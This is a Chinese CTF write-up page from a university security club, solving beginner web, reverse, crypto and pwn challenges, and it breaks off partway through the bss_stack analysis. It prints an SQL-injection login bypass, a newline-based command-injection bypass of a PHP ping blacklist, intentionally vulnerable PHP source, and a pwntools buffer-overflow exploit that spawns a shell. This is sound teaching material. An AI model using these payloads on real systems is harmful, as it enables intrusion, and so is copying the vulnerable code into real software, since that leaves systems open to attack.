@@ -1,0 +1,796 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Writeup,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/s.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="Webseu_wlan level_1seu_wlan系列题目界面均使用学校seu_wlan的认证界面，第一关想要获取flag只需要模拟手机访问然后查看源码即可获取flag。关于模拟手机可以修改请求头中的User-Agent为手机的User-Agent，或者直接安装firefox插件useragent-switcher; huaji右键查看源码，可以看到&amp;lt;script&amp;gt;标签内有一串颜文">
+<meta name="keywords" content="Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUS十一欢乐赛 writeup">
+<meta property="og:url" content="http://yoursite.com/CTF/Writeup/SUS十一欢乐赛-writeup/index.html">
+<meta property="og:site_name" content="SUS">
+<meta property="og:description" content="Webseu_wlan level_1seu_wlan系列题目界面均使用学校seu_wlan的认证界面，第一关想要获取flag只需要模拟手机访问然后查看源码即可获取flag。关于模拟手机可以修改请求头中的User-Agent为手机的User-Agent，或者直接安装firefox插件useragent-switcher; huaji右键查看源码，可以看到&amp;lt;script&amp;gt;标签内有一串颜文">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p7lc13qga.bkt.clouddn.com/shot.png">
+<meta property="og:updated_time" content="2019-02-02T00:38:08.545Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SUS十一欢乐赛 writeup">
+<meta name="twitter:description" content="Webseu_wlan level_1seu_wlan系列题目界面均使用学校seu_wlan的认证界面，第一关想要获取flag只需要模拟手机访问然后查看源码即可获取flag。关于模拟手机可以修改请求头中的User-Agent为手机的User-Agent，或者直接安装firefox插件useragent-switcher; huaji右键查看源码，可以看到&amp;lt;script&amp;gt;标签内有一串颜文">
+<meta name="twitter:image" content="http://p7lc13qga.bkt.clouddn.com/shot.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: undefined,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/CTF/Writeup/SUS十一欢乐赛-writeup/">
+
+  <title> SUS十一欢乐赛 writeup | SUS </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e877d3fb346f9b6606dfc92ef67f044f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+    
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader" style="background-image: url('/images/home.jpg');">
+      <div class="header-inner"><a class="site-home" href="/">SUS</a>
+
+<div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <div href="/" class="brand">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">SUS</span>
+      <span class="logo-line-after"><i></i></span>
+    </div>
+  </div>
+  <p class="site-subtitle">秉承古典黑客精神，引领一流网络安全体验</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-notice">
+          <a href="/tags/Notice/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-bell"></i> <br>
+            
+            Notice
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-course">
+          <a href="/course" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            Course
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-oj">
+          <a href="/CtfPlantform" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br>
+            
+            OJ
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-wiki">
+          <a href="/wiki" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wikipedia-w"></i> <br>
+            
+            CTF-wiki
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+      <div class="header-post"> 
+  <div class="post-header">
+      <div class="tags">
+      
+        <a href="/tags/Writeup/" rel="tag" title="Writeup">Writeup</a>
+      
+      </div>
+      <h1>SUS十一欢乐赛 writeup</h1>
+      <h2 class="subtitle"></h2>
+      <div class="post-time">
+        <span class="post-meta-item-text">Posted on </span>
+        <time itemprop="dateCreated" datetime="2018-10-08T21:38:17+08:00" content="2018-10-08" title="2018-10-08 21:38:17">
+          2018-10-08
+        </time>
+      </div>
+  </div>
+ </div>
+    </header>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                SUS十一欢乐赛 writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2018-10-08T21:38:17+08:00" content="2018-10-08">
+              2018-10-08
+            </time>
+          </span>
+
+          
+            <span class="post-category">
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTF/Writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">Writeup</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          <!-- 
+            
+           -->
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="seu-wlan-level-1"><a href="#seu-wlan-level-1" class="headerlink" title="seu_wlan level_1"></a>seu_wlan level_1</h3><p>seu_wlan系列题目界面均使用学校seu_wlan的认证界面，第一关想要获取flag只需要模拟手机访问然后查看源码即可获取flag。关于模拟手机可以修改请求头中的User-Agent为手机的User-Agent，或者直接安装firefox插件useragent-switcher;</p>
+<h3 id="huaji"><a href="#huaji" class="headerlink" title="huaji"></a>huaji</h3><p>右键查看源码，可以看到<code>&lt;script&gt;</code>标签内有一串颜文字，为aaencode后的js，只需要f12调出开发者工具，在控制台中执行即可获取base64加密后的flag，解密即可获取flag。</p>
+<h3 id="seu-wlan-level-2"><a href="#seu-wlan-level-2" class="headerlink" title="seu_wlan level_2"></a>seu_wlan level_2</h3><p>访问welcome.txt可以获取后台源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"db.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"source file in web9.php.bak"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = $_POST[username];</span><br><span class="line">$pass = md5($_POST[password]);</span><br><span class="line">$sql = <span class="string">"select * from php where user='$user' and pw='$pass'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">	printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ($row) &#123;</span><br><span class="line">	  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Hello $user &lt;/p&gt;"</span>;</span><br><span class="line">	  <span class="keyword">if</span>($row[role]==<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">		  <span class="keyword">echo</span> <span class="string">"you are admin! flag is FLAG&#123;&#125;;1</span></span><br><span class="line"><span class="string">	  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else &#123;</span></span><br><span class="line"><span class="string">	echo("</span>&lt;p&gt;Log in failure! we will redirect you in <span class="number">2</span> seconds&lt;/p&gt;<span class="string">");</span></span><br><span class="line"><span class="string">	echo("</span>&lt;script&gt;setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;history.go(<span class="number">-1</span>)&#125;,<span class="number">2000</span>)&lt;/script&gt;<span class="string">");	</span></span><br><span class="line"><span class="string">  &#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>其中可以看到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user = $_POST[username];</span><br><span class="line">$pass = md5($_POST[password]);</span><br><span class="line">$sql = <span class="string">"select * from php where user='$user' and pw='$pass'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br></pre></td></tr></table></figure></p>
+<p>user变量为POST方法传递的username参数值，直接拼接到了sql语句中。因此username处存在sql注入。</p>
+<p>所以登录用户名<code>ad&#39; or role=1#</code>,密码随意，拼接后的sql语句变成<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> php <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'ad'</span> <span class="keyword">or</span> <span class="keyword">role</span>=<span class="number">1</span><span class="comment">#' and pw='xxx'</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到能够成功绕过登录验证，即可获取flag。</p>
+<h3 id="seu-wlan-crack"><a href="#seu-wlan-crack" class="headerlink" title="seu_wlan crack"></a>seu_wlan crack</h3><p>此题的目的是让大家熟悉burpsuite intruder模块的使用，题目描述很清楚，大家只要生成对应的密码表爆破密码即可，密码表只要写一个小程序就能生成。<br>具体怎样使用burpsuite intruder爆破密码参考</p>
+<ul>
+<li><a href="http://www.freebuf.com/articles/web/100377.html" target="_blank" rel="noopener">Burp Suite新手指南</a></li>
+<li><a href="https://blog.csdn.net/weixin_38948797/article/details/79111566" target="_blank" rel="noopener">安全测试——利用Burpsuite密码爆破（Intruder入侵）</a></li>
+</ul>
+<h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>查看源码或者f12的开发者工具里面可以获得ping操作的http请求为post到exec.php页面，post数据为ip=xxx.</p>
+<p>查看页面源码，可以发现提示了exec.php的源码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- exec.php?view_source--&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>访问<code>http://69.171.76.88:30004/exec.php?view_source</code>可以获取exec.php文件的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'view_source'</span>]))show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line"></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">    $target=trim($target);</span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($target);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        </span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 1 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到程序逻辑为对ip进行了一系列的过滤，最后调用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = shell_exec( <span class="string">'ping  -c 1 '</span> . $target );</span><br></pre></td></tr></table></figure></p>
+<p>过滤规则为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$substitutions = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">       <span class="string">';'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">       <span class="string">'|'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">       <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">       <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">       <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">       <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">       <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">       <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">   $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br></pre></td></tr></table></figure></p>
+<p>然而并没有过滤<code>\n</code>(换行符).</p>
+<p>因此可以使用换行符绕过.具体操作:<br><img src="http://p7lc13qga.bkt.clouddn.com/shot.png" alt="screenshot"></p>
+<p>这里发送数据包使用的是burpsuite的repeater，在burpsuite中先抓取封包后右键点击send to repeater即可，具体使用方法可以百度。%0a是urlencode后的换行符。</p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="0x00-HelloReverse"><a href="#0x00-HelloReverse" class="headerlink" title="0x00 HelloReverse"></a>0x00 HelloReverse</h3><p>这道题作为逆向的签到题，目的就是让大家了解一下ida的基础使用，所以内容并没有设置什么困难，程序的流程就是要求用户输入一个数字，如果是2333333则执行 <code>get_flag()</code> 函数，所以根据逆向出的信息运行一下程序即可，顺便督促大家装一下 Linux 虚拟机233，但是还是有头铁的同学去看了 <code>get_flag()</code> 。</p>
+<h3 id="0x01-HelloPython"><a href="#0x01-HelloPython" class="headerlink" title="0x01 HelloPython"></a>0x01 HelloPython</h3><p>这道题还是比较简单的，利用现有的工具将 Python 字节码还原到源码再进行分析，对于不熟悉 Python 的同学可能还需要一点时间了解一下。程序流程就是检查执行代码文件时传入的命令行参数，符合要求则输出flag。解法有很多，可以通过 <code>Fibonacci</code> 这个函数名搜索到这是一个计算斐波那契数列的函数（或分析算法看出，为了降低难度并没有修改名称），然后得出程序要求的参数值。或是直接修改还原出的代码，直接执行解密函数。都可以得到答案。</p>
+<h3 id="0x02-XOR1"><a href="#0x02-XOR1" class="headerlink" title="0x02 XOR1"></a>0x02 XOR1</h3><p>一个简单的异或算法，程序中有两个数组，密文和密钥，明文与密钥异或可以得到密文，这个地方可能由于ida在反编译的时候不能很好地识别数组所以用指针表示造成了一些困难，如果比较熟悉c语言的话应该不是问题。</p>
+<h3 id="0x03-XOR2"><a href="#0x03-XOR2" class="headerlink" title="0x03 XOR2"></a>0x03 XOR2</h3><p>是XOR1的升级版，将密文存入了全局变量，对寻找密文增加了一些困难，通过密钥使用伪随机生成，c语言的随机数是通过种子来生成的，同一个种子会产生同样的随机数序列，如果不了解c语言随机数这个特点很难解题。</p>
+<h3 id="0x04-Maze"><a href="#0x04-Maze" class="headerlink" title="0x04 Maze"></a>0x04 Maze</h3><p>这个是后来补的一道题，走迷宫可以说是非常规加密算法中比较经典的一个了，其中map变量存的是迷宫的地图，通过输入的 <code>wasd</code> 来控制光标的上下左右移动，从入口移动到出口，移动过程的输入值即为flag。这道题在编译的时候忘记去掉符号了= =看着变量名有比较强的提示性。</p>
+<h3 id="0x05-BabyAndroid"><a href="#0x05-BabyAndroid" class="headerlink" title="0x05 BabyAndroid"></a>0x05 BabyAndroid</h3><p>由于我平时也不怎么写 Android 应用，所以就写了一个很简单的小程序，明文flag比较，会使用工具即可解题。</p>
+<h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>这次没出 Windows 的逆向主要是我没装 Windows 下的开发环境 Orz (懒)， 希望大家玩的开心 :)<br>欢迎对逆向有兴趣的同学来和我交流w</p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="1-base1"><a href="#1-base1" class="headerlink" title="1.  base1"></a>1.  base1</h3><p>简单的base64编码，解码即可。<br>base64的简单判断：结尾带”=”，因为编码时用”=”填充</p>
+<h3 id="2-base2"><a href="#2-base2" class="headerlink" title="2.  base2"></a>2.  base2</h3><p>base91编码，解码即可<br>附上解码网址   <a href="http://ctf.ssleye.com/base91.html" target="_blank" rel="noopener">http://ctf.ssleye.com/base91.html</a></p>
+<p>base91和base64的区别在于，base64使用64个字符进行编码，而base91使用91个字符进行编码。</p>
+<h3 id="3-中国人的价值观"><a href="#3-中国人的价值观" class="headerlink" title="3.  中国人的价值观"></a>3.  中国人的价值观</h3><p>这是我在bugku上发现的一个编码——核心价值观编码<br>工具的地址为  <a href="https://sym233.github.io/core-values-encoder/" target="_blank" rel="noopener">https://sym233.github.io/core-values-encoder/</a><br>解密即可</p>
+<h3 id="4-这不是凯撒"><a href="#4-这不是凯撒" class="headerlink" title="4.  这不是凯撒"></a>4.  这不是凯撒</h3><p>ascii码编码向后位移一位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print &apos;&apos;.join([chr(ord(i)-1) for i in &quot;gmbh|E1`z1v`lo1x`btd22~&quot;])</span><br></pre></td></tr></table></figure>
+<h3 id="5-are-you-ok"><a href="#5-are-you-ok" class="headerlink" title="5.  are you ok"></a>5.  are you ok</h3><p>Ook!!编码    <a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a><br>解密即可。</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="1-helloworld"><a href="#1-helloworld" class="headerlink" title="1.helloworld"></a>1.helloworld</h3><p>这道题算是pwn的签到题目，连接上即可得flag</p>
+<h3 id="2-年轻人的第二道pwn"><a href="#2-年轻人的第二道pwn" class="headerlink" title="2. 年轻人的第二道pwn"></a>2. 年轻人的第二道pwn</h3><p>就是为了开始真正的pwn做铺垫</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:000000000040059F                 call    _system</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br><span class="line">.text:00000000004005A5</span><br><span class="line">.text:00000000004005A6</span><br></pre></td></tr></table></figure>
+<p>可以看到 callsystem的地址为 0x400596</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000080 buf             db ?</span><br><span class="line">-000000000000007F                 db ? ; undefined</span><br><span class="line">-000000000000007E                 db ? ; undefined</span><br><span class="line">-000000000000007D                 db ? ; undefined</span><br><span class="line">-000000000000007C                 db ? ; undefined</span><br><span class="line">-000000000000007B                 db ? ; undefined</span><br><span class="line">-000000000000007A                 db ? ; undefined</span><br><span class="line">.....</span><br><span class="line">-0000000000000002                 db ? ; undefined</span><br><span class="line">-0000000000000001                 db ? ; undefined</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br></pre></td></tr></table></figure>
+<p>buf到r的距离  0x80+8  即 0x88<br>为什么是加呢？ 看到相对地址前的符号没有，“-”和“+”</p>
+<h3 id="3-pwn2plus"><a href="#3-pwn2plus" class="headerlink" title="3. pwn2plus"></a>3. pwn2plus</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [sp+0h] [bp-80h]@1</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到read()处存在栈溢出，我们输入字符填充缓冲区，再用callsystem的地址覆盖read的ret即可，之前的第二题padding的长度，和需要的地址都已经得到了。</p>
+<p>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io=remote(&quot;47.100.40.190&quot;,10007)</span><br><span class="line">io.recvline()</span><br><span class="line">shellcode=&apos;a&apos;*0x88+p64(0x400596)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="4-bss-stack"><a href="#4-bss-stack" class="headerlink" title="4. bss_stack"></a>4. bss_stack</h3><p>先走一下程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure></p>
+<p>可以看到连不可执行栈的保护都没开启，说明之后我们可能有机会直接将shellcode写在栈上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uns3t@uns3t-virtual-machine:~/桌面/task$ file pwn3 </span><br><span class="line">pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e37a77866ac49198fd206b278e61d44c3f4d8939, stripped</span><br></pre></td></tr></table></figure>
+<p>这是32位的程序不需要担心调用函数时传参的问题。</p>
+<p>运行一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Welcome to warhamer</span><br><span class="line">Hello &apos;111111&apos;, what would you like to do ?</span><br><span class="line"> 1. Process authentification</span><br><span class="line"> 2. Exit this cool program</span><br><span class="line">Action:</span><br></pre></td></tr></table></figure>
+<p>是一道菜单型的题目呢，接下来就是分析程序了，上ida</p>
